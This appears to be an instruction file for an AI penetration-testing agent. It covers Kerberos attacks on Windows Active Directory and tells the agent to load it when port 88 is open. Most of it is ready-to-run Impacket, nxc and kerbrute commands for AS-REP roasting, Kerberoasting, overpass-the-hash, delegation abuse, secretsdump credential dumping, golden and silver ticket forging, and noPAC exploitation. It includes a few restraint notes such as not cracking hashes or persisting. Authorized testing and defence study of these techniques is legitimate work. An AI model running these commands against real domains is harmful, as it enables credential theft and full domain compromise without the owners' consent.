---
name: windows-kerberos
description: Kerberos attacks — AS-REP roast, Kerberoast, overpass-the-hash, pass-the-ticket, S4U, unconstrained/constrained/RBCD, golden/silver/diamond tickets. Use when port 88 is open or a domain user exists.
metadata:
  version: '1.0'
---

# Kerberos

Need `/etc/hosts` or DNS so `<dc-fqdn>` and `<domain>` resolve to `<dc-ip>`. Optional `KRB5CCNAME` after `getTGT.py`.

## Unauthenticated

**AS-REP roast (DONT_REQ_PREAUTH):**

```
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -request
nxc ldap <dc-ip> --asreproast   # if null LDAP works
```

Hash `$krb5asrep$23$...` ⇒ finding. Do not crack by default.

**User enum (no lockout):**

```
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=users.txt <dc-ip>
kerbrute userenum --dc <dc-ip> -d <domain> users.txt
```

**Timeroasting** (computer accounts): `nxc smb <dc-ip> --timeroast`.

## Authenticated roast

```
GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <dc-ip> -request
GetUserSPNs.py <domain>/<user>:'<pass>' -request-dc-only
# Cross-domain: -target-domain other.domain
```

AES vs RC4: request RC4 if the account supports it (older crack path). Still **record, don't crack**.

**Targeted Kerberoast:** if you have `WriteSPN` / `GenericWrite` on a user, set a fake SPN, roast, restore SPN (`targetedKerberoast.py`). Load `windows-ldap-acl`.

## Tickets from a hash or password

```
getTGT.py <domain>/<user>:'<pass>' -dc-ip <dc-ip>
getTGT.py <domain>/<user> -hashes :<nt> -dc-ip <dc-ip>          # overpass-the-hash
getTGT.py <domain>/<user> -aesKey <aes256> -dc-ip <dc-ip>
export KRB5CCNAME=<user>.ccache
nxc smb <ip> -k --use-kcache
secretsdump.py -k -no-pass <DOMAIN>/<user>@<fqdn>
```

Pass-the-ticket: inject `.ccache` / `.kirbi`; do not need the password again.

## Delegation

Load BloodHound first when possible.

**Unconstrained:** host with `TRUSTED_FOR_DELEGATION`. Coerce a DC/admin to it (`windows-coerce-relay`), steal forwarded TGT from memory (`Rubeus monitor` / `ticketer` / `secretsdump` on that host). PrinterBug/PetitPotam → DC TGT ⇒ DCSync.

**Constrained (S4U):** `msDS-AllowedToDelegateTo` lists SPNs. With the service hash:

```
getST.py -spn 'cifs/<target>' -impersonate Administrator \
  <domain>/<svc>:'<pass>' -dc-ip <dc-ip>
# S4U2Self + S4U2Proxy; protocol transition if TRUSTED_TO_AUTH_FOR_DELEGATION
```

**RBCD (resource-based):** write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer (GenericWrite on computer, or relay to LDAP). Then:

```
# after addcomputer.py created FAKE01$
getST.py -spn 'cifs/<target-fqdn>' -impersonate Administrator \
  -hashes :<fake-nt> <domain>/FAKE01$ -dc-ip <dc-ip>
```

**Bronze Bit (CVE-2020-17049):** constrained delegation PAC bypass on unpatched DCs — only if `nxc` reports the CVE.

## Forged tickets (high impact — prove with a single SPN/DCSync, don't persist)

- **Golden:** `krbtgt` NT/AES from DCSync/NTDS. `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain <domain> Administrator`
- **Silver:** service account hash → that SPN only.
- **Diamond / Sapphire:** PAC request from DC (stealthier golden); Certipy/`ticketer` variants.
- **SID History / ExtraSid:** enterprise admin SID in PAC — `windows-trusts`.

## noPAC / samAccountName spoof (CVE-2021-42278 + 42287)

Needs MAQ or a computer you control + unpatched DC:

```
# create machine, rename sAMAccountName to DC short name without $, request TGT, rename back, S4U2Self to DC$
# tools: noPac.py / sam-the-admin / nxc smb -M nopac
```

Probe `nxc smb <dc> -M nopac` before exploitation.

## KrbRelay / KrbRelayUp

Relay Kerberos (not NTLM) to LDAP for RBCD when the attacker is on a domain-joined machine or can coerce. See `windows-coerce-relay` and `windows-privesc`.
